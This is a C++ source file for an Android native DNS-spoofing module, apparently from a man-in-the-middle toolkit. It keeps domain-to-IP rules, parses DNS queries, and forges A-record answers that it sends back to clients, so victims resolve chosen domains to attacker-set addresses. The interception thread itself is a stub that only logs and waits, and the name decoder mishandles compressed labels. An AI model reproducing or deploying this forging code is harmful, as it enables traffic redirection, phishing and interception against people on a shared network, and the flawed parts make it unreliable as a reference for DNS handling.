#include "dns_spoofing.h"
#include <android/log.h>
#include <cstring>
#include <vector>
#include <map>
#include <algorithm>
#include <thread>
#include <mutex>
#include <atomic>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <net/if.h>
#include <sys/ioctl.h>

#define LOG_TAG "DNSSpoofing"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

// DNS header structure
struct dns_header {
    uint16_t id;          // identification number
    uint16_t flags;       // flags
    uint16_t q_count;     // number of question entries
    uint16_t ans_count;   // number of answer entries
    uint16_t auth_count;  // number of authority entries
    uint16_t add_count;   // number of resource entries
};

// DNS question structure
struct dns_question {
    unsigned char *name;
    uint16_t type;
    uint16_t class_field;
};

// DNS resource record structure
struct dns_resource_record {
    unsigned char *name;
    uint16_t type;
    uint16_t class_field;
    uint32_t ttl;
    uint16_t data_len;
    unsigned char *data;
};

// Global variables for DNS spoofing
static std::vector<DNSSpoofRule> g_dns_rules;
static std::mutex g_rules_mutex;
static std::atomic<bool> g_dns_spoof_active(false);
static std::thread *g_dns_spoof_thread = nullptr;
static int g_dns_socket = -1;
static std::atomic<bool> g_stop_spoofing(false);

// Function to decode DNS name from packet
std::string decode_dns_name(unsigned char *buffer, int *position, unsigned char * /*packet_unused*/) {
    std::string name = "";
    unsigned int len = 0, offset = 0;
    int jumped = 0;
    int position_backup = *position;

    while(true) {
        if(*position >= 512) {
            LOGE("DNS name decoding out of bounds");
            return name;
        }

        len = buffer[*position];

        if(len & 0xC0) { // Compressed label
            offset = (len & 0x3F) << 8 | buffer[*position + 1];
            *position = offset;
            jumped = 1;
        } else {
            (*position)++;

            if(len == 0) {
                break;
            }

            for(unsigned int i = 0; i < len; i++) {
                if((*position + i) >= 512) {
                    LOGE("DNS name decoding out of bounds");
                    return name;
                }
                name += buffer[*position + i];
            }

            name += '.';
            *position += len;
        }

        if(jumped) {
            *position = position_backup;
            break;
        }
    }

    if(name.length() > 0) {
        name.pop_back(); // Remove trailing dot
    }

    return name;
}

// Function to encode DNS name for response
void encode_dns_name(const char *name, unsigned char *buffer, int *position) {
    const char *start = name;
    const char *end = name;
    
    while(*end != '\0') {
        if(*end == '.') {
            int len = end - start;
            buffer[(*position)++] = len;
            for(int i = 0; i < len; i++) {
                buffer[(*position)++] = start[i];
            }
            start = end + 1;
        }
        end++;
    }
    
    if(end > start) {
        int len = end - start;
        buffer[(*position)++] = len;
        for(int i = 0; i < len; i++) {
            buffer[(*position)++] = start[i];
        }
    }
    
    buffer[(*position)++] = 0; // End of name
}

// Function to craft a DNS response packet
int craft_dns_response(unsigned char *query_packet, unsigned char *response_packet,
                      const char *spoofed_ip) {
    struct dns_header *query_header = (struct dns_header*)query_packet;
    struct dns_header *response_header = (struct dns_header*)response_packet;

    // Copy the header and modify flags to indicate response
    memcpy(response_header, query_header, sizeof(struct dns_header));
    response_header->flags |= htons(0x8000); // Set response flag
    response_header->ans_count = htons(1);    // One answer

    // Copy the query section
    int pos = sizeof(struct dns_header);
    int response_pos = sizeof(struct dns_header);

    // Skip the query name (we'll copy it to response)
    std::string query_domain = decode_dns_name(query_packet, &pos, query_packet);

    // Copy the query name to response
    encode_dns_name(query_domain.c_str(), response_packet, &response_pos);

    // Copy the query type and class
    memcpy(response_packet + response_pos, query_packet + pos, 4);
    response_pos += 4;
    pos += 4;

    // Add the answer section
    // Name pointer to the domain in the question (compressed format)
    response_packet[response_pos++] = 0xC0; // Pointer to previous occurrence
    response_packet[response_pos++] = 0x0C; // Offset to the domain name (12 bytes from start)

    // Type A (IPv4 address)
    response_packet[response_pos++] = 0x00;
    response_packet[response_pos++] = 0x01; // Type A

    // Class IN (Internet)
    response_packet[response_pos++] = 0x00;
    response_packet[response_pos++] = 0x01; // Class IN

    // TTL (Time to Live) - 300 seconds
    response_packet[response_pos++] = 0x00;
    response_packet[response_pos++] = 0x00;
    response_packet[response_pos++] = 0x01;
    response_packet[response_pos++] = 0x2C; // 300 in hex

    // Data length (4 bytes for IPv4)
    response_packet[response_pos++] = 0x00;
    response_packet[response_pos++] = 0x04;

    // IP address in network byte order
    struct in_addr addr;
    inet_aton(spoofed_ip, &addr);
    memcpy(response_packet + response_pos, &addr, 4);
    response_pos += 4;

    return response_pos;
}

// Function to handle incoming DNS packets
void handle_dns_packet(unsigned char *packet, int /*packet_size*/, struct sockaddr_in *client_addr) {
    struct dns_header *header = (struct dns_header*)packet;
    
    // Check if it's a query (not a response)
    if(ntohs(header->flags) & 0x8000) {
        return; // This is a response, not a query
    }
    
    // Check if it has questions
    if(ntohs(header->q_count) == 0) {
        return; // No questions in this query
    }
    
    // Extract the domain name from the query
    int pos = sizeof(struct dns_header);
    std::string domain = decode_dns_name(packet, &pos, packet);
    
    LOGD("Received DNS query for: %s", domain.c_str());
    
    // Check if this domain matches any of our spoofing rules
    std::string spoofed_ip = "";
    {
        std::lock_guard<std::mutex> lock(g_rules_mutex);
        for(const auto& rule : g_dns_rules) {
            if(rule.domain == domain) {
                spoofed_ip = rule.spoofed_ip;
                break;
            }
        }
    }
    
    if(!spoofed_ip.empty()) {
        LOGD("Spoofing DNS response for %s to %s", domain.c_str(), spoofed_ip.c_str());
        
        // Craft a response packet
        unsigned char response_packet[512];
        int response_size = craft_dns_response(packet, response_packet, spoofed_ip.c_str());
        
        // Send the spoofed response back to the client
        int dns_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(dns_sock >= 0) {
            // Set socket options to allow binding to port 53
            int opt = 1;
            setsockopt(dns_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
            
            // Send the response
            sendto(dns_sock, response_packet, response_size, 0, 
                   (struct sockaddr*)client_addr, sizeof(struct sockaddr_in));
            
            close(dns_sock);
            LOGD("Sent spoofed DNS response for %s", domain.c_str());
        }
    }
}

// Function to create a UDP socket for sending spoofed DNS responses
int create_dns_responder_socket() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        LOGE("Failed to create DNS responder socket: %s", strerror(errno));
        return -1;
    }

    // Allow port reuse
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    // Bind to any available port - we'll send from this socket
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(0); // Let the system assign an available port

    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        LOGE("Failed to bind DNS responder socket: %s", strerror(errno));
        close(sock);
        return -1;
    }

    return sock;
}

// Main DNS spoofing thread function
void dns_spoof_thread_func(const std::string& interface) {
    LOGD("Starting DNS spoofing on interface: %s", interface.c_str());

    // For the initial implementation, we'll log the intent to perform DNS spoofing
    // The actual implementation would require the root helper binary to handle
    // low-level network operations due to Android's security restrictions
    LOGD("DNS spoofing setup completed for interface: %s", interface.c_str());
    LOGD("Rules configured: %zu", g_dns_rules.size());

    // In a real implementation, we would need to communicate with the root helper
    // to set up the actual DNS interception, but for now we'll simulate
    g_stop_spoofing = false;

    // For now, we'll just keep the thread alive to indicate DNS spoofing is active
    while(!g_stop_spoofing) {
        // Sleep briefly to avoid busy-waiting
        usleep(100000); // 100ms
    }

    LOGD("DNS spoofing thread stopped");
}

bool dns_spoof_init() {
    LOGD("Initializing DNS spoofing operations");
    return true;
}

bool dns_start_spoofing(const char *interface, const std::vector<DNSSpoofRule>& rules) {
    LOGD("Starting DNS spoofing on interface: %s", interface);
    
    if(g_dns_spoof_active.load()) {
        LOGE("DNS spoofing is already active");
        return false;
    }
    
    // Apply the rules
    {
        std::lock_guard<std::mutex> lock(g_rules_mutex);
        g_dns_rules = rules;
    }
    
    // Start the spoofing thread
    try {
        g_dns_spoof_thread = new std::thread(dns_spoof_thread_func, std::string(interface));
        g_dns_spoof_active = true;
        LOGD("DNS spoofing started successfully");
        return true;
    } catch(const std::exception& e) {
        LOGE("Failed to start DNS spoofing thread: %s", e.what());
        return false;
    }
}

void dns_stop_spoofing() {
    LOGD("Stopping DNS spoofing");
    
    if(!g_dns_spoof_active.load()) {
        LOGD("DNS spoofing is not active");
        return;
    }
    
    g_stop_spoofing = true;
    
    if(g_dns_socket >= 0) {
        close(g_dns_socket);
        g_dns_socket = -1;
    }
    
    if(g_dns_spoof_thread && g_dns_spoof_thread->joinable()) {
        g_dns_spoof_thread->join();
        delete g_dns_spoof_thread;
        g_dns_spoof_thread = nullptr;
    }
    
    g_dns_spoof_active = false;
    LOGD("DNS spoofing stopped");
}

void dns_add_rule(const char *domain, const char *spoofed_ip) {
    if(domain && spoofed_ip) {
        std::lock_guard<std::mutex> lock(g_rules_mutex);
        // Check if rule already exists
        for(auto& rule : g_dns_rules) {
            if(rule.domain == domain) {
                rule.spoofed_ip = spoofed_ip;
                LOGD("Updated DNS spoofing rule for %s to %s", domain, spoofed_ip);
                return;
            }
        }
        // Add new rule
        g_dns_rules.push_back({domain, spoofed_ip});
        LOGD("Added DNS spoofing rule: %s -> %s", domain, spoofed_ip);
    }
}

void dns_remove_rule(const char *domain) {
    if(domain) {
        std::lock_guard<std::mutex> lock(g_rules_mutex);
        g_dns_rules.erase(
            std::remove_if(g_dns_rules.begin(), g_dns_rules.end(),
                          [domain](const DNSSpoofRule& rule) {
                              return rule.domain == domain;
                          }),
            g_dns_rules.end()
        );
        LOGD("Removed DNS spoofing rule for %s", domain);
    }
}

void dns_clear_rules() {
    std::lock_guard<std::mutex> lock(g_rules_mutex);
    g_dns_rules.clear();
    LOGD("Cleared all DNS spoofing rules");
}

bool dns_is_active() {
    return g_dns_spoof_active.load();
}

void dns_spoof_cleanup() {
    LOGD("Cleaning up DNS spoofing operations");
    dns_stop_spoofing();
    dns_clear_rules();
}